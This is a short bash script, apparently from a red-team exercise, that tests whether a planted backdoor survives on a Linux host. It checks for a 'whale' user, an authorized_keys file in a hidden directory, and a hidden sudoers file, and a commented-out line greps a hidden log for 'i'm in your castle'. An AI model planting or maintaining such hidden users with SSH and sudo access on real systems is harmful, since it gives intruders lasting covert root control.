#!/bin/bash
# whale squad - test script
# Purpose: verify backdoor user functionality

id whale || exit 1 # checks if user exists
[ -s /var/lib/.whale/.ssh/authorized_keys ] || exit 1 #checks if authkeys file exists and is not empty
[ -f /etc/sudoers.d/.whale_apt ] || exit 1 #check sudoers 
#KMG edit:if ! tail -n 5 /var/log/.whale_apt.log | grep -q "i'm in your castle"; then 
#KMG    exit 3
#KMGfi
exit 0  # if everything works
